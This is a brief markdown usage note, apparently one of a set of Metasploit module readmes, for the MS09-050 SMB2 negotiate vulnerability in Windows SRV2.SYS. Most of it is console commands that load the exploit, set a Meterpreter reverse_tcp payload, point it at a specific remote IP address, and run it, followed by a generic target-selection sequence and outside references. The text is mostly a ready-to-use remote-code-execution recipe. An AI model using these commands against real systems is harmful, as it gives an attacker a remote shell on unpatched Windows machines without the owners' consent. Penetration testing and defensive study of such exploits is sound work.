# MS09-050

```
This module exploits an out of bounds function table dereference in the SMB 
request validation code of the SRV2.SYS driver included with Windows Vista, 
Windows 7 release candidates (not RTM), and Windows 2008 Server prior to R2. 
Windows Vista without SP1 does not seem affected by this flaw.
```

Vulnerability reference:
 * [MS09-050](https://technet.microsoft.com/library/security/ms09-050)
 * [CVE-2009-2532](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2532)
 
## Usage
```
msf > search MS09_050
msf > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index 
msf exploit(ms09_050_smb2_negotiate_func_index) > options
msf exploit(ms09_050_smb2_negotiate_func_index) > set payload windows/meterpreter/reverse_tcp
msf exploit(ms09_050_smb2_negotiate_func_index) > set rhost 110.196.193.102
msf exploit(ms09_050_smb2_negotiate_func_index) > run
```
  
  

## load the module within the Metasploit console
[msf](https://www.rapid7.com/db/modules/exploit/windows/smb/ms09_050_smb2_negotiate_func_index)
```
msf > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
msf exploit(ms09_050_smb2_negotiate_func_index) > show targets
    ...targets...
msf exploit(ms09_050_smb2_negotiate_func_index) > set TARGET <target-id>
msf exploit(ms09_050_smb2_negotiate_func_index) > show options
    ...show and set options...
msf exploit(ms09_050_smb2_negotiate_func_index) > exploit
```

## References
[MS09-050漏洞测试](http://edu.aqniu.com/group/30/thread/107)  
[MS09-050 vulnerability](https://www.youtube.com/watch?v=cytEOUQ6QsI)  



